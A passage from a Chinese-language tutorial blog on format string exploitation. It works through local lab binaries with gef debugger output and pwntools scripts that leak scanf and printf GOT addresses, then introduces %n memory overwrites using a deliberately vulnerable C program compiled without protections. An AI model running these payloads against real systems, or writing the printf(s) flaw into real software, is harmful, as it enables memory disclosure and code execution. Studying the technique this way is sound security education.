+0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
+0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so
+0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so
+0xfffdd000 0xffffe000 0x00000000 rw- [stack]
+
+gef➤  x/x 0x24303125
+0x24303125:    Cannot access memory at address 0x24303125<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>显然0xffffd008处所对应的格式化字符串所对应的变量值0x24303125并不能够被该程序访问，所以程序自然就崩溃了。</p>
+<p>那么如果我们设置一个可以访问的地址呢？比如说scanf@got，结果会怎么样呢？应该自然是输出scanf对应的地址了。我们不妨来试一下。</p>
+<p>首先，获取scanf@got的地址，如下</p>
+<pre class="line-numbers language-shell"><code class="language-shell">gef➤  got
+
+/home/devil/leakmemory:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049ffc R_386_GLOB_DAT    __gmon_start__
+0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0
+0804a010 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
+0804a014 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+0804a018 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>下面我们利用pwntools构造payload如下</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>
+__isoc99_scanf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__isoc99_scanf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>__isoc99_scanf_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'%10$s'</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'%10$s\n'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#remove the first bytes of __isoc99_scanf@got</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>其实，我们使用gdb.attach(sh)来进行调试。当我们运行到第二个printf函数的时候(要在调试窗口用 “b printf”命令给printf函数下断点)，可以看到我们的第四个参数(stack上第一个地址是返回地址，第二个是格式化字符串地址，之后依次为第一…四个参数)确实指向我们的scanf的地址，这里输出</p>
+<pre class="line-numbers language-shell"><code class="language-shell">gef➤  c
+Continuing.
+
+Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:28
+28    printf.c: No such file or directory.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp
+$ebx   : 0x0       
+$ecx   : 0x1       
+$edx   : 0xf7f1d87c  →  0x00000000
+$esp   : 0xff8ccb9c  →  0x0804851d  →  <main+98> add esp, 0x20
+$ebp   : 0xff8ccc48  →  0x00000000
+$esi   : 0xf7f1c000  →  0x001b1db0
+$edi   : 0xf7f1c000  →  0x001b1db0
+$eip   : 0xf7db3670  →  <printf+0> call 0xf7e89b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xff8ccb9c│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp
+0xff8ccba0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"
+0xff8ccba4│+0x0008: 0x00000001
+0xff8ccba8│+0x000c: 0x22222222
+0xff8ccbac│+0x0010: 0xffffffff
+0xff8ccbb0│+0x0014: 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp
+0xff8ccbb4│+0x0018: 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp
+0xff8ccbb8│+0x001c: 0xf7f63918  →  0x00000000
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7db3667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
+   0xf7db366d                  nop    
+   0xf7db366e                  xchg   ax, ax
+ → 0xf7db3670 <printf+0>       call   0xf7e89b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7e89b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7e89b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7e89b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7e89b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7e89b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7e89b64 <__x86.get_pc_thunk.si+3> ret    
+─────────────────────────────────────────────────────── arguments (guessed) ────
+__x86.get_pc_thunk.ax (
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "leakmemory", stopped 0xf7db3670 in __printf (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7db3670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")
+[#1] 0x804851d → main()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>同时，在我们运行的terminal下</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exp.py
+[+] Starting local process './leakmemory': pid 2673
+[*] '/home/devil/leakmemory'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+0x804a018
+\x18\x04%10$s
+[*] running in new terminal: /usr/bin/gdb -q  "./leakmemory" 2673 -x "/tmp/pwnqnvV9v.gdb"
+[+] Waiting for debugger: Done
+0xf7dc60c0
+[*] Switching to interactive mode
+[*] Process './leakmemory' stopped with exit code 0 (pid 2673)
+[*] Got EOF while reading in interactive
+$  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们确实得到了scanf的地址。</p>
+<blockquote>
+<p>Wiki上这里是用scanf举例说明的，并且表示之所以没有使用printf函数，是因为printf函数会对0a,0b,0c,00等字符有一些奇怪的处理，导致无法正常读入。</p>
+</blockquote>
+<p>所以我就尝试了一下泄露printf函数的地址。</p>
+<p>构造payload如下</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>
+printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'%10$s'</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'%10$s\n'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>terminal运行结果如下</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exp.py
+[+] Starting local process './leakmemory': pid 2747
+[*] '/home/devil/leakmemory'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+0x804a00c
+\x0c\x04%10$s
+[*] running in new terminal: /usr/bin/gdb -q  "./leakmemory" 2747 -x "/tmp/pwn71yrFD.gdb"
+[+] Waiting for debugger: Done
+Traceback (most recent call last):
+  File "exp.py", line 11, in <module>
+    print(hex(u32(sh.recv()[4:8])))
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 82, in recv
+    return self._recv(numb, timeout) or b''
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 160, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 131, in _fillbuffer
+    data = self.recv_raw(self.buffer.get_fill_size())
+  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/process.py", line 707, in recv_raw
+    raise EOFError
+EOFError
+[*] Process './leakmemory' stopped with exit code -11 (SIGSEGV) (pid 2747)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>栈上的值如下</p>
+<pre class="line-numbers language-shell"><code class="language-shell">gef➤  c
+Continuing.
+
+Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:28
+28    printf.c: No such file or directory.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffc82d58  →  0x250804a0
+$ebx   : 0x0       
+$ecx   : 0x1       
+$edx   : 0xf7eca87c  →  0x00000000
+$esp   : 0xffc82d1c  →  0x0804851d  →  <main+98> add esp, 0x20
+$ebp   : 0xffc82dc8  →  0x00000000
+$esi   : 0xf7ec9000  →  0x001b1db0
+$edi   : 0xf7ec9000  →  0x001b1db0
+$eip   : 0xf7d60670  →  <printf+0> call 0xf7e36b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffc82d1c│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp
+0xffc82d20│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"
+0xffc82d24│+0x0008: 0x00000001
+0xffc82d28│+0x000c: 0x22222222
+0xffc82d2c│+0x0010: 0xffffffff
+0xffc82d30│+0x0014: 0xffc82d58  →  0x250804a0
+0xffc82d34│+0x0018: 0xffc82d58  →  0x250804a0
+0xffc82d38│+0x001c: 0xf7f10918  →  0x00000000
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7d60667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
+   0xf7d6066d                  nop    
+   0xf7d6066e                  xchg   ax, ax
+ → 0xf7d60670 <printf+0>       call   0xf7e36b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7e36b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7e36b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7e36b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7e36b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7e36b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7e36b64 <__x86.get_pc_thunk.si+3> ret    
+─────────────────────────────────────────────────────── arguments (guessed) ────
+__x86.get_pc_thunk.ax (
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "leakmemory", stopped 0xf7d60670 in __printf (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7d60670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")
+[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可见程序并没有如同预期一样输出printf的地址。</p>
+<p>有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p>
+<pre><code>[padding][addr]</code></pre><p>注意</p>
+<blockquote>
+<p>我们在gef中使用got命令的时候，已经打印出了printf的got地址</p>
+<p>0804a00c R_386_JUMP_SLOT   <a href="mailto:printf@GLIBC_2.0">printf@GLIBC_2.0</a></p>
+<p>但是我们不能直接在命令行输入\x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是printf@got的地址，但是，scanf函数并不会将其识别为对应的字符串，而是会将\,x,0,c分别作为一个字符进行读入。下面就是错误的例子。</p>
+</blockquote>
+<pre class="line-numbers language-shell"><code class="language-shell">gef➤  r
+Starting program: /home/devil/leakmemory 
+\\x0c\\xa0\\x04\\x08%10$s
+00000001.22222222.ffffffff.\\x0c\\xa0\\x04\\x08%10$s
+
+Program received signal SIGSEGV, Segmentation fault.
+__strlen_ia32 () at ../sysdeps/i386/i686/multiarch/../../i586/strlen.S:94
+94    ../sysdeps/i386/i686/multiarch/../../i586/strlen.S: No such file or directory.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x30785c5c ("\\x0"?)
+$ebx   : 0x0       
+$ecx   : 0xf7fb6000  →  0x001b1db0
+$edx   : 0x0       
+$esp   : 0xffffc4ec  →  0xf7e45977  →  <printf_positional+7575> add esp, 0x10
+$ebp   : 0xffffca98  →  0xffffcfb8  →  0xffffd078  →  0x00000000
+$esi   : 0xffffc680  →  0xffffffff
+$edi   : 0xf7fb6d60  →  0xfbad2a84
+$eip   : 0xf7e795f1  →  <__strlen_ia32+49> mov ecx, DWORD PTR [eax]
+$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffc4ec│+0x0000: 0xf7e45977  →  <printf_positional+7575> add esp, 0x10     ← $esp
+0xffffc4f0│+0x0004: 0x30785c5c ("\x0"?)
+0xffffc4f4│+0x0008: 0x00000000
+0xffffc4f8│+0x000c: 0x00000028 ("("?)
+0xffffc4fc│+0x0010: 0x00000000
+0xffffc500│+0x0014: 0xffffd008  →  "\x0c\xa0\x04\x08%10$s"
+0xffffc504│+0x0018: 0x00000000
+0xffffc508│+0x001c: 0x00000000
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7e795e7 <__strlen_ia32+39> xor    BYTE PTR [edi], cl
+   0xf7e795e9 <__strlen_ia32+41> test   BYTE PTR [eax+0x40000000], cl
+   0xf7e795ef <__strlen_ia32+47> xor    edx, edx
+ → 0xf7e795f1 <__strlen_ia32+49> mov    ecx, DWORD PTR [eax]
+   0xf7e795f3 <__strlen_ia32+51> add    eax, 0x4
+   0xf7e795f6 <__strlen_ia32+54> sub    edx, ecx
+   0xf7e795f8 <__strlen_ia32+56> add    ecx, 0xfefefeff
+   0xf7e795fe <__strlen_ia32+62> dec    edx
+   0xf7e795ff <__strlen_ia32+63> jae    0xf7e79659 <__strlen_ia32+153>
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "leakmemory", stopped 0xf7e795f1 in __strlen_ia32 (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7e795f1 → __strlen_ia32()
+[#1] 0xf7e45977 → printf_positional(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=0xffffd008 "\\\\x0c\\\\xa0\\\\x04\\\\x08%10$s", readonly_format=0x0, ap=<optimized out>, ap_savep=0xffffcb7c, done=0x14, nspecs_done=0x0, lead_str_end=0xffffd01c "%10$s", work_buffer=0xffffcbb8 "@\001", save_errno=0x0, grouping=0x0, thousands_sep=0xf7f5f7d2 "")
+[#2] 0xf7e46401 → _IO_vfprintf_internal(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=<optimized out>, ap=0xffffcfe4 "\b\320\377\377\030\331\377\367\377\265", <incomplete sequence \360>)
+[#3] 0xf7e4d696 → __printf(format=0xffffd008 "\\\\x0c\\\\xa0\\\\x04\\\\x08%10$s")
+[#4] 0x804852c → main()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  x/x 0xffffd008
+0xffffd008:    0x30785c5c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p>
+<blockquote>
+<p>%n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
+</blockquote>
+<p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，<strong>一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量</strong>。</p>
+<p>这里我们给出如下的程序来介绍相应的部分。</p>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    #<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数要放在<span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>前面，确保第一次在printf中断时，程序已经读入格式化字符串
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>这里和wiki上有点区别，就在于第一个scanf(“%s”,s)和printf(“%p\n”,&amp;c)的顺序。wiki上是printf在前，但是我按照他那样编译调试的时候stack中不能同时显示c的地址和格式化字符串的地址，所以我换了一下位置进行编译调试。但在后面修改c的值的时候，用此脚本编译出来的程序在接收c地址的时候出了点问题。</p>
+</blockquote>
+<p>编译成32位程序</p>
+<pre class="line-numbers language-sh"><code class="language-sh">devil@ubuntu:~$ gcc -m32 -fno-stack-protector -no-pie -o overflow overflow.c
+overflow.c: In function ‘main’:
+overflow.c:9:10: warning: format not a string literal and no format arguments [-Wformat-security]
+   printf(s);
+          ^<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的payload</p>
+<pre class="line-numbers language-sh"><code class="language-sh">...[overwrite addr]....%[overwrite offset]$n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其中…表示我们的填充内容，overwrite addr表示我们所要覆盖的地址，overwrite offset地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p>
+<ul>
+<li>确定覆盖地址</li>
+<li>确定相对偏移</li>
+<li>进行覆盖</li>
+</ul>
+<h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p>
+<h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>其次，我们来确定一下存储格式化字符串的地址是printf将要输出的第几个参数()。这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb overflow
+gef➤  b printf
+Breakpoint 1 at 0x8048340
+gef➤  r
+Starting program: /home/devil/overflow 
+%d%d
+
+Breakpoint 1, __printf (format=0x80485c3 "%p\n") at printf.c:28
+28    printf.c: No such file or directory.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffd06c  →  0x00000315
+$ebx   : 0x0       
+$ecx   : 0x1       
+$edx   : 0xf7fb787c  →  0x00000000
+$esp   : 0xffffcfec  →  0x080484c8  →  <main+61> add esp, 0x10
+$ebp   : 0xffffd078  →  0x00000000
+$esi   : 0xf7fb6000  →  0x001b1db0
+$edi   : 0xf7fb6000  →  0x001b1db0
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffcfec│+0x0000: 0x080484c8  →  <main+61> add esp, 0x10     ← $esp
+0xffffcff0│+0x0004: 0x080485c3  →  "%p\n"
+0xffffcff4│+0x0008: 0xffffd06c  →  0x00000315
+0xffffcff8│+0x000c: 0x000000c2
+0xffffcffc│+0x0010: 0xf7e946bb  →  <handle_intel+107> add esp, 0x10
+0xffffd000│+0x0014: 0xffffd02e  →  0xffff0000  →  0x00000000
+0xffffd004│+0x0018: 0xffffd12c  →  0xffffd30a  →  "XDG_VTNR=7"
+0xffffd008│+0x001c: "%d%d"
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
+   0xf7e4d66d                  nop    
+   0xf7e4d66e                  xchg   ax, ax
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
+─────────────────────────────────────────────────────── arguments (guessed) ────
+__x86.get_pc_thunk.ax (
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "overflow", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7e4d670 → __printf(format=0x80485c3 "%p\n")
+[#1] 0x80484c8 → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
